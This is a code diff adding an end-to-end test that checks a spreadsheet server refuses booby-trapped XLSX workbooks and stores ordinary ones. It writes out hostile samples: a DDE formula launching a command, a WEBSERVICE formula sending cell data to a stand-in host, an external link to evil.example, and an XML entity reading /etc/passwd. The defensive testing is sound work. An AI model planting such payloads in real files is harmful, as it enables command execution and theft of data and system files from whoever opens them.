@@ -23,6 +23,8 @@
 import * as Y from '../../apps/web/node_modules/yjs/dist/yjs.mjs';
 import { SheetsModel } from '../../apps/web/lib/sheets/model.ts';
 import { writeXlsx, readXlsx } from '../../apps/web/lib/sheets/io/xlsx.ts';
+import { readZip, writeZip } from '../../apps/web/lib/sheets/io/zip.ts';
+import { emptySheet, cellKey } from '../../apps/web/lib/sheets/workbook.ts';
 
 const API = process.env.SHEETS_API ?? 'http://localhost:5151/api';
 // The platform operator, who switches Docs (and so Sheets) on per organisation.
@@ -222,6 +224,75 @@ async function main() {
   try { readBack = await readXlsx(dl.bytes); } catch (e) { readBack = null; console.log('   ', e); }
   const cell = readBack?.sheets[0]?.cells.get('4,0');
   check('…and it reads back with the formula and its value', cell?.input === '=SUM(A3:A4)' && cell?.value === 200000, JSON.stringify(cell));
+
+  console.log('The server refuses a workbook that would attack whoever opens it');
+  // XlsxGuard.cs (Mr. Singh, 25 Sept 2026). Formulas are ordinary content and
+  // pass; macros, embedded objects, links outside the file and calling-out
+  // formulas are refused. Every refusal has its permit twin in this run.
+  const send = (bytes: Uint8Array) => A(`/docs/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({
+    state: b64(Y.encodeStateAsUpdate(a1!.doc)), upToSeq: a1!.lastSeq, html: '<table></table>', text: 'Fee', xlsx: b64(bytes) }) });
+
+  // Permit 1: an ordinary workbook with ordinary formulas (incl. HYPERLINK, and "|" inside text).
+  const plainSheet = emptySheet('Fees');
+  plainSheet.cells.set(cellKey(0, 0), { input: '10' });
+  plainSheet.cells.set(cellKey(1, 0), { input: '=SUM(A1:A1)*2', value: 20 });
+  plainSheet.cells.set(cellKey(2, 0), { input: '=IF(A1>5,"big|small","no")', value: 'big|small' });
+  plainSheet.cells.set(cellKey(3, 0), { input: '=HYPERLINK("https://tatvaos.com","site")', value: 'site' });
+  plainSheet.cells.set(cellKey(4, 0), { input: '=VLOOKUP(A1,A1:A2,1,FALSE)', value: 10 });
+  const plainXlsx = await writeXlsx({ sheets: [plainSheet] });
+  const permit1 = await send(plainXlsx);
+  check('permit: an ordinary workbook with ordinary formulas is stored (200)', permit1.status === 200, `${permit1.status} ${JSON.stringify(permit1.body)}`);
+
+  // Permit 2: the honest editor given dangerous INPUT writes it as text — never refused.
+  const honest = emptySheet('Fees');
+  honest.cells.set(cellKey(0, 0), { input: "=cmd|' /c calc'!A0" });
+  honest.cells.set(cellKey(1, 0), { input: '=WEBSERVICE("https://x.example/"&A1)' });
+  honest.cells.set(cellKey(2, 0), { input: "='[Budget.xlsx]Sheet1'!A1" });
+  const permit2 = await send(await writeXlsx({ sheets: [honest] }));
+  check('permit: what the editor writes from dangerous-looking input is stored (it became text)', permit2.status === 200,
+    `${permit2.status} ${JSON.stringify(permit2.body)}`);
+
+  // The hostile variants, each built from the ordinary workbook's own parts.
+  const base = await readZip(plainXlsx);
+  const text = (name: string) => new TextDecoder().decode(base.get(name)!);
+  const build = async (changes: Record<string, string | Uint8Array | null>) => {
+    const files = new Map(base);
+    for (const [name, v] of Object.entries(changes)) {
+      if (v === null) files.delete(name); else files.set(name, typeof v === 'string' ? new TextEncoder().encode(v) : v);
+    }
+    return writeZip([...files].map(([name, data]) => ({ name, data })));
+  };
+  const withFormula = (f: string) => text('xl/worksheets/sheet1.xml').replace(/<f>SUM\(A1:A1\)\*2<\/f>/, `<f>${f}</f>`);
+  // Permit 3: the same substitution with an ordinary formula goes through — so each
+  // refusal below is the RULE firing, not the substitution breaking the file.
+  const permit3 = await send(await build({ 'xl/worksheets/sheet1.xml': withFormula('&quot;a|b[c]&quot;&amp;A1') }));
+  check('permit: a hand-substituted formula with "|" and "[" only inside quoted text is stored', permit3.status === 200,
+    `${permit3.status} ${JSON.stringify(permit3.body)}`);
+  check('…and the substitution really happened (calibration)', withFormula('X') !== text('xl/worksheets/sheet1.xml'));
+
+  const hostile: [string, string, Record<string, string | Uint8Array | null>][] = [
+    ['a macro project (vbaProject.bin)', 'macro_or_binary_part', { 'xl/vbaProject.bin': new Uint8Array([1, 2, 3]) }],
+    ['a macro-enabled content type', 'macro_content_type', { '[Content_Types].xml': text('[Content_Types].xml').replace('</Types>',
+      '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/></Types>') }],
+    ['an embedded object', 'embedded_object', { 'xl/embeddings/Microsoft_Word_Document.docx': new Uint8Array([80, 75, 3, 4]) }],
+    ['an external-link part', 'external_link', { 'xl/externalLinks/externalLink1.xml': '<externalLink/>' }],
+    ['a data connection', 'data_connection', { 'xl/connections.xml': '<connections/>' }],
+    ['a relationship pointing outside the file', 'external_relationship', { 'xl/_rels/workbook.xml.rels': text('xl/_rels/workbook.xml.rels').replace('</Relationships>',
+      '<Relationship Id="rX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://evil.example/" TargetMode="External"/></Relationships>') }],
+    ['a DDE formula', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula("cmd|' /c calc'!A0") }],
+    ['a formula into another workbook', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('[1]Sheet1!A1') }],
+    ['a web-fetching formula', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('_xlfn.WEBSERVICE(&quot;https://x.example/&quot;&amp;A1)') }],
+    ['a defined name that runs DDE', 'calling_out_formula', { 'xl/workbook.xml': text('xl/workbook.xml').replace('</workbook>',
+      '<definedNames><definedName name="evil">cmd|\' /c calc\'!A0</definedName></definedNames></workbook>') }],
+    ['a DOCTYPE', 'doctype', { 'xl/sharedStrings.xml': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><sst/>' }],
+  ];
+  for (const [label, reason, changes] of hostile) {
+    const r = await send(await build(changes));
+    check(`refused: ${label} (400 ${reason})`, r.status === 400 && r.body?.reason === reason, `${r.status} ${JSON.stringify(r.body)}`);
+  }
+  // Put the real workbook back as the Space copy for the checks that follow.
+  const restored = await send(xlsx);
+  check('the real workbook is stored again', restored.status === 200, `${restored.status}`);
 
   console.log('Documents and spreadsheets do not cross');
   const doc = await A('/docs', { method: 'POST', body: JSON.stringify({ title: 'E2E doc', scope: 'personal' }) });
